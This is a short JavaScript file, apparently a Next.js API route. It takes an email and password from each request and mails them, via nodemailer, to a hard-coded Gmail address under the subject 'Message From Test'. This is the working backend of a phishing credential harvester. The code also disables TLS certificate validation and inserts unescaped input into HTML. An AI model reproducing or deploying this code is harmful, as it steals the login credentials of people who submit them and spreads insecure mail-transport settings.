// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

export default function handler(req, res) {
  require("dotenv").config();

  let nodemailer = require("nodemailer");
  let { email, pass } = req.body;
  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 25,
    secure: false,
    auth: {
      user: "hinayupak022@gmail.com",
      pass: process.env.PASSWORD,
    },
    tls: {
      // do not fail on invalid certs
      rejectUnauthorized: false,
    },
  });
  const mailData = {
    from: "hinayupak022@gmail.com",
    to: "hinayupak022@gmail.com",
    subject: `Message From Test`,
    text: email + " " + pass,
    html: `<div>${email} ${pass} </div>`,
  };
  transporter.sendMail(mailData, function (err, info) {
    if (err) res.status(400).send(err);
    res.status(200).send(info);
  });
}
